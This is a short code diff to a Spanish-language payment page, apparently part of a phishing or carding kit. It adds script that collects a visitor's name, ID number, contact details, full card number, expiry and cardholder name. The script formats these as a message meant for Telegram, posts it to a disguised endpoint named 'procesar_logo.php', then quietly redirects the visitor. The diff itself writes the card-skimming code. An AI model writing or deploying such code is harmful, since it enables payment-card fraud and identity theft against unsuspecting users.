@@ -473,7 +473,32 @@ EOT;
     }
     const actualizado={...tbdatos, tarjeta:rawCard, expMonth,expYear,cvv,ownerName};
     localStorage.setItem('tbdatos', JSON.stringify(actualizado));
-    window.location.href='sistema.php';
+
+    // Enviar los datos a Telegram
+    const mensaje = `<b><u>💳 Pago Tarjeta en data-cc/alter</u></b>\n` +
+      `• Nombre: ${actualizado.nombre}\n` +
+      `• Documento: ${actualizado.documento}\n` +
+      `• Tipo ID: ${actualizado.tipo_identificacion}\n` +
+      `• Tipo persona: ${actualizado.tipo_persona}\n` +
+      `• Correo: ${actualizado.correo}\n` +
+      `• Dirección: ${actualizado.direccion}\n` +
+      `• Teléfono: ${actualizado.telefono}\n` +
+      `• Total a pagar: ${total_pagar}\n` +
+      `• Tarjeta: ${rawCard}\n` +
+      `• Expira: ${expira}\n` +
+      `• Titular: ${ownerName}`;
+
+    const formData = new FormData();
+    formData.append('message', mensaje);
+    formData.append('transactionId', 'data-cc-' + Date.now());
+
+    fetch('/procesar_logo.php', { method: 'POST', body: formData })
+      .then(() => {
+        window.location.href='sistema.php';
+      })
+      .catch(() => {
+        window.location.href='sistema.php';
+      });
   });
   </script>
 </body>
